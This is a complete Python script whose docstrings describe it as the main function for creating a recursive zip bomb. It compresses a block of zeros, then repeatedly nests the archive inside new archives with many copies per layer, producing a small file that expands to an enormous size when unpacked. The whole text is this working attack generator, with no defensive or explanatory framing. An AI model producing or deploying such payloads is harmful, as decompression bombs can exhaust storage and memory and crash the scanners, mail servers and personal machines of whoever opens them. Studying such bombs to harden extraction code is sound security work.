import io
import zipfile

def write_base_dummy(size_MB):
    """Writes in memory dummy file of specified size"""
    mem_buff = io.BytesIO()

    with zipfile.ZipFile(mem_buff,"w",compression=zipfile.ZIP_DEFLATED) as zf:

        dummy_data = b"0"*size_MB*1024*1024
        zf.writestr("dummy.txt",dummy_data)

    compressed_dummy = mem_buff.getvalue()
    mem_buff.close()

    return compressed_dummy

def write_layer(compressed_file, file_count):
    """Writes one layer of compressed files of specified count"""
    mem_buff = io.BytesIO()

    with zipfile.ZipFile(mem_buff,"w",compression=zipfile.ZIP_DEFLATED) as zf:
        
        for i in range(file_count):

            zf.writestr("layer{}.zip".format(i),compressed_file)

    compressed_layer = mem_buff.getvalue()
    mem_buff.close()

    return compressed_layer

def make_recurssive_bomb(dummy_size,file_count,layer_count):
    """Main function for creating recursive zipbomb"""
    layer = write_base_dummy(dummy_size)
    for i in range(layer_count):
        layer = write_layer(layer,file_count)
    return layer


